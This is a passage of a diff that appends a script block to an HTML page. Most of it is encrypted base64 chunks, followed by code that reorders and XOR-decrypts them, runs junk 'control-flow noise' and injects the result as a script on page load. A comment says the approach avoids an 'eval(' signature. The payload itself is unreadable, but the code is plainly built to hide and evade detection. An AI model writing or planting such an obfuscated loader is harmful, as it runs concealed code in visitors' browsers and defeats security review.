'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'];
+
+  function b64ToBytes(s) {
+    const bin = atob(s);
+    const out = new Uint8Array(bin.length);
+    for (let i=0;i<bin.length;i++) out[i] = bin.charCodeAt(i);
+    return out;
+  }
+
+  // control-flow noise
+  const junk = (n) => {
+    let x = 0;
+    for (let i=0;i<n;i++) x = (x * 1664525 + 1013904223) >>> 0;
+    return x;
+  };
+  junk(2000);
+
+  // reconstruct encrypted bytes in original order
+  let totalLen = 0;
+  const bytesArr = new Array(order.length);
+  for (let i=0;i<order.length;i++) {
+    const p = b64ToBytes(parts[order[i]]);
+    bytesArr[i] = p;
+    totalLen += p.length;
+  }
+
+  const encAll = new Uint8Array(totalLen);
+  let off = 0;
+  for (let i=0;i<bytesArr.length;i++) {
+    encAll.set(bytesArr[i], off);
+    off += bytesArr[i].length;
+  }
+
+  // XOR decrypt
+  for (let i=0;i<encAll.length;i++) {
+    encAll[i] = encAll[i] ^ key[i % key.length];
+  }
+
+  // UTF-8 decode
+  const decoded = new TextDecoder('utf-8').decode(encAll);
+
+  // Execute in global scope without eval()
+  // NOTE: new Function is still dynamic code execution, but avoids "eval(" signature.
+  // Execute by injecting a script tag (runs in page/global scope)
+  const sc = document.createElement('script');
+  sc.type = 'text/javascript';
+  sc.text = decoded;
+  document.head.appendChild(sc);
+})();</script>
 </body>
 </html>
